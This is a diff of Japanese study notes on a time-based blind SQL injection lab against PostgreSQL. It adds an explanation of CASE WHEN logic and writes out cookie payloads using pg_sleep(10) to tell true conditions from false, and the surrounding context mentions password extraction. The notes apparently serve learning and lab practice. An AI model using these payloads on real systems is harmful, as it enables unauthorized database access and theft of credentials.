@@ -145,7 +145,34 @@ Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0
 - Forward → **10秒遅延**  
 - → True 条件で遅延が発生することを確認
 
----
+## 🔹 CASE 文の本質（これだけ覚えればOK）
+```
+CASE WHEN 条件 THEN A ELSE B END
+```
+
+- 条件 = **True** → A が実行される  
+- 条件 = **False** → B が実行される  
+- THEN は **True のときだけ**  
+- False のとき THEN は **絶対に実行されない**
+
+
+
+1=1（True）
+```
+CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0)
+```
+→ True → **10秒寝る**  
+→ 注入が効いているか確認
+
+
+1=2（False）
+```
+CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0)
+```
+→ False → **0秒（寝ない）**  
+→ True/False の時間差が取れることを確認  
+→ **Blind SQLi が成立**
+
 
 ## Step 3: 偽の条件テスト（1=2）
 TrackingId を以下に変更：
@@ -295,4 +322,5 @@ Password: (抽出したパスワード)
 - レスポンス時間で True/False を判定
 
 ---
+
 
